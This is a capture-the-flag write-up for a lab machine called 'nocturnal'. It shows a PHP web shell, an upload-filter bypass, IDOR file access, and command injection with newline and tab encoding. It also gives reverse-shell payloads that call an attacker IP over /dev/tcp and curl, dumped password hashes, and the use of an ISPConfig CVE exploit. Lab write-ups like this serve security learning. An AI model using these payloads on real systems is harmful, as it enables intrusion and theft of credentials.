---
layout: post
title: "nocturnal"
date: 2025-08-28 
categories: ctf
---
# Attack Path

First let’s enumerate:

```bash
sudo nmap -sC -sV 10.10.11.64

result:
PORT      STATE    SERVICE          VERSION
22/tcp    open     ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp    open     http             nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
427/tcp   filtered svrloc
1031/tcp  filtered iad2
1328/tcp  filtered ewall
2002/tcp  filtered globe
2222/tcp  filtered EtherNetIP-1
3052/tcp  filtered powerchute
3322/tcp  filtered active-net
3517/tcp  filtered 802-11-iapp
4006/tcp  filtered pxc-spvr
5631/tcp  filtered pcanywheredata
7778/tcp  filtered interwise
7999/tcp  filtered irdmi2
8994/tcp  filtered unknown
9071/tcp  filtered unknown
9111/tcp  filtered DragonIDSConsole
9220/tcp  filtered unknown
9898/tcp  filtered monkeycom
11110/tcp filtered sgi-soap
12345/tcp filtered netbus
13783/tcp filtered netbackup
15003/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The target has a web page, let’s go visit. Upon visiting, we need to add nocturnal.htb to our /etc/hosts/ file

Let’s also open burp.

![image.png]({{ site.baseurl }}/assets/nocturnal/image.png)

Visiting the page, we get a login or register page. Default credentials admin:admin failed and we also failed to register a new user. Let’s try to enumerate the sub directories.

```bash
ffuf -u http://10.10.11.64 -H "Host: FUZZ.nocturnal.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fw 4

ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://nocturnal.htb/FUZZ -ic
                        [Status: 200, Size: 1524, Words: 272, Lines: 30, Duration: 23ms]
uploads                 [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 15ms]
backups                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 17ms]
                        [Status: 200, Size: 1524, Words: 272, Lines: 30, Duration: 21ms]
uploads2                [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 31ms]

ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt:FUZZ -u http://nocturnal.htb/FUZZ -ic -e .php
```

Let’s try going to backups:

![image.png]({{ site.baseurl }}/assets/nocturnal/image%201.png)

Viewing the page source, we also find these two .php pages:

```bash
login.php
register.php
```

![image.png]({{ site.baseurl }}/assets/nocturnal/image%202.png)

Turns the the machine was just bugged. We can register a new user and log in, which gives us the ability to upload files. 

Let’s try to upload a simple web shell; webshell.php:

```bash
<?php system($_GET['cmd']); ?>
```

We get denied:

```bash
Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed. 
```

Let’s try to bypass it.

Let’s try append the allowed extension at the back:

```bash
webshell.php.pdf
```

![image.png]({{ site.baseurl }}/assets/nocturnal/image%203.png)

It got uploaded.

When we click in the file we uploaded, it downloads the file to our local device. This is the burp request:

![image.png]({{ site.baseurl }}/assets/nocturnal/image%204.png)

This is a potential IDOR vulnerability, let’s see if we can fuzz the username and file parameter.

Let’s test it out.

First let’s try if we can view wild card characters, and list all the files:

![image.png]({{ site.baseurl }}/assets/nocturnal/image%205.png)

![image.png]({{ site.baseurl }}/assets/nocturnal/image%206.png)

We can. Let’s see if we can view other users’ file. When we first tried to register, we tried as admin, however, it failed, leading us to believe that the user is already registered. Let’s see if we can change the username to that:

![image.png]({{ site.baseurl }}/assets/nocturnal/image%207.png)

![image.png]({{ site.baseurl }}/assets/nocturnal/image%208.png)

It seems to be working, but there are no files to download. We also check some of the other extensions but it did not amount to anything. Now let’s attempt to fuzz for usernames and find other users that might have files on the server.

First, let’s change the value for the username to =FUZZ, then copy to file. Now, we use ffuf

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -request view.req -request-proto http -fs 2985

amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 35ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 24ms]
```

Now, we can go back on burp, and go input the username as one of the users and search for files with file=*.*.

The following yielded results

```bash
username=amanda&filename=any.pdf

privacy.odt
```

It turns out, when we are trying the wildcard matching, the backend is not accepting the wildcard, but, it is probably just outputting files available after the error File does not exist. Let’s download this

Now in the response, highlight the content, excluding the headers, then copy to file and save it

![image.png]({{ site.baseurl }}/assets/nocturnal/image%209.png)

```bash
Dear Amanda,
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.

Yours sincerely,
Nocturnal's IT team
```

We now have a password.

```bash
arHkG7HAI68X8s1J
```

Let’s try login as amanda with the password.

![image.png]({{ site.baseurl }}/assets/nocturnal/image%2010.png)

Let’s go to admin panel

![image.png]({{ site.baseurl }}/assets/nocturnal/image%2011.png)

We have the ability to create a backup zip file, after entering the password of amanda. Let’s read admin.php and see how the function actually works. 

The relevant code snippets are:

```bash
<?php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];
```

In the $command section, the user controlled variable $password is used, so maybe we can leverage command injection here. What is also relevant is that the cleanEntry function is used. Searching for that function in the code revealed that the website have also blacklisted characters:

```bash
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
```

And this custom table is helpful to see what other characters are could still be used

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
| --- | --- | --- | --- |
| Semicolon | `;` | `%3b` | Both |
| New Line | `\n` | `%0a` | Both |
| Background | `&` | `%26` | Both (second output generally shown first) |
| Pipe | `|` | `%7c` | Both (only second output is shown) |
| AND | `&&` | `%26%26` | Both (only if first succeeds) |
| OR | `||` | `%7c%7c` | Second (only if first fails) |
| Sub-Shell | ```` | `%60%60` | Both (Linux-only) |
| Sub-Shell | `$()` | `%24%28%29` | Both (Linux-only) |
| tab |  | `%09` |  |

Looks like we can use newline character to start a new command, and tab character to replace space. Let’s test if it works. First, let’s capture the request that creates the zip file with burp intercept:

![image.png]({{ site.baseurl }}/assets/nocturnal/image%2012.png)

The command used is:

```bash
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";

#so we have control of the $password variable.

zip -x './backups/*' -r -P " . $password . "
```

We know that the server takes around 2 seconds to respond, let’s put a sleep command and let it sleep for 10 seconds:

```bash
%0asleep%0910%0a

request:
password=hello%0asleep%0910%0a&backup=

This will make the command
zip -x './backups/*' -r -P " . $password . "

sleep     10

" . $backupFile . " .  > " . $logFile . " 2>&1 &;
```

It worked. Now let’s try and execute a reverse shell:

```bash
/bin/bash -i >& /dev/tcp/10.10.16.2/4444 0>&1
echo -n '/bin/bash -i >& /dev/tcp/10.10.16.2/4444 0>&1' | base64
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIvNDQ0NCAwPiYx

payload = %0abash<<<$(base64%09-d<<<L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIvNDQ0NCAwPiYx)

All together:
password=hello%0abash<<<$(base64%09-d<<<L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIvNDQ0NCAwPiYx)%0a&backup=
```

Let’s start a listener:

```bash
nc -lnvp 4444
```

Did not work as we have used a blacklisted character ‘$’. 

Anther way around this is to create a file that has the reverse shell:

```bash
bash -i >& /dev/tcp/10.10.16.2/4444 0>&1
```

Now host the file on a python server:

```bash
python3 -m http.server 8001
```

And now our original payload is:

```bash
payload:
curl -o /tmp/shell.sh http://10.10.16.2:8001/shell.sh 
bash /tmp/shell.sh
```

Our encoded is:

```bash
password=hello%0acurl%09-o%09/tmp/shell.sh%09http://10.10.16.2:8001/shell.sh%0abash%09/tmp/shell.sh&backup=
```

We now have shell:

![image.png]({{ site.baseurl }}/assets/nocturnal/image%2013.png)

Navigating around, we find a db at nocturnal_database dir:

Let’s attempt to dump the db:

```bash
sqlite3 nocturnal_database.db .dump
```

We find all files and users on the web:

```bash
INSERT INTO users VALUES(1,'admin','d725aeba143f575736b07e045d8ceebb');
INSERT INTO users VALUES(2,'amanda','df8b20aa0c935023f99ea58358fb63c4');
INSERT INTO users VALUES(4,'tobias','55c82b1ccd55ab219b3b109b07d5061d');
INSERT INTO users VALUES(6,'kavi','f38cde1654b39fea2bd4f72f1ae4cdda');
INSERT INTO users VALUES(7,'e0Al5','101ad4543a96a7fd84908fd0d802e7db');
INSERT INTO users VALUES(8,'bob','8bd118ba5c79b5735f959f5129c4313c');
INSERT INTO users VALUES(9,'smithy','5d93ceb70e2bf5daa84ec3d0cd2c731a');

```

Looks like simple hash. Let’s use crackstation to see if admin or tobias is crackable and whether the password is reused.

```bash
tobias:slowmotionapocalypse
```

And looking at /home we see user tobias:

```bash
ls /home
tobias
```

Let’s attempt to ssh:

```bash
ssh tobias@10.10.11.64
```

We are in.

Let’s look at the ports:

```bash
State             Recv-Q            Send-Q                       Local Address:Port                        Peer Address:Port            Process            
LISTEN            0                 128                                0.0.0.0:22                               0.0.0.0:*                                  
LISTEN            0                 10                               127.0.0.1:25                               0.0.0.0:*                                  
LISTEN            0                 70                               127.0.0.1:33060                            0.0.0.0:*                                  
LISTEN            0                 151                              127.0.0.1:3306                             0.0.0.0:*                                  
LISTEN            0                 10                               127.0.0.1:587                              0.0.0.0:*                                  
LISTEN            0                 4096                             127.0.0.1:8080                             0.0.0.0:*                                  
LISTEN            0                 511                                0.0.0.0:80                               0.0.0.0:*                                  
LISTEN            0                 4096                         127.0.0.53%lo:53                               0.0.0.0:*                                  
LISTEN            0                 128                                   [::]:22                                  [::]:* 
```

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

#nothing interesting
```

```bash
find / -user tobias -ls 2>/dev/null
find / -group tobias 2>/dev/null
```

Let’s get linpeas:

```bash
wget -O linpeas.sh http://10.10.16.2:8001/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Nothing stood out. Let’s look at the open ports. 8080 seems interesting as normally web pages are hosted there:

```bash
curl -i http://localhost:8080

HTTP/1.1 302 Found
Host: localhost:8080
Date: Thu, 28 Aug 2025 16:22:33 GMT
Connection: close
X-Powered-By: PHP/7.4.3-4ubuntu2.29
Content-Type: text/html; charset=utf-8
Set-Cookie: ISPCSESS=ujhu7qo5nj3k6vedn3cd0hqkmo; path=/; HttpOnly; SameSite=Lax
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /login/
Vary: Accept-Encoding

```

Let’s forward it to our [localhost](http://localhost) so we can have a better look:

```bash
ssh tobias@10.10.11.64 -L 8080:localhost:8080
```

![image.png]({{ site.baseurl }}/assets/nocturnal/image%2014.png)

Tried default credentials:

```bash
admin:admin
admin:demo

```

In the /var/www folder, we see a ispconfig dir. However, we do not have permission to go into it.

Let’s try the master password from before as amanada, admin and tobias. No result. Let’s try it now with tobias’ password:

```bash
admin:slowmotionapocalypse
```

We are in.

In the help tab, we find the version: ISPConfig Version: 3.2.10p1

![image.png]({{ site.baseurl }}/assets/nocturnal/image%2015.png)

A search on Google revealed exploit:

[https://github.com/ajdumanhug/CVE-2023-46818](https://github.com/ajdumanhug/CVE-2023-46818)

Let’s download the exploit and try it out.

```bash
python3 exploit.py http://localhost:8080 admin slowmotionapocalypse
```

![image.png]({{ site.baseurl }}/assets/nocturnal/image%2016.png)

now we can get root flag

```bash
cat /root/root.txt
```